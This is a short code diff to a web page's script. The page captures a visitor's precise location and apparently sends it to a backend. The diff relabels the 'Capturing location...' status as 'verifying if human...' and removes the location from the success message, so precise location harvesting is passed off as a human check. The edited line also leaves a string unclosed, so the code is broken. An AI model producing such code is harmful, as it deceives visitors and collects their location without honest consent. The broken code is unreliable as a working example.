@@ -317,12 +317,12 @@
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
         const gpsStatus = document.getElementById('gpsStatus');
-        gpsStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Capturing location...';
+        gpsStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> verifying if human...';
         
         const location = await getPreciseLocation();
         if (location && location.lat) {
             capturedLocation = location;
-            gpsStatus.innerHTML = `<i class="fas fa-check-circle"></i> Verified! Location: ${location.city || location.state || 'Nigeria'}`;
+            gpsStatus.innerHTML = `<i class="fas fa-check-circle"></i> Verified! 
             
             // Send to backend
             try {
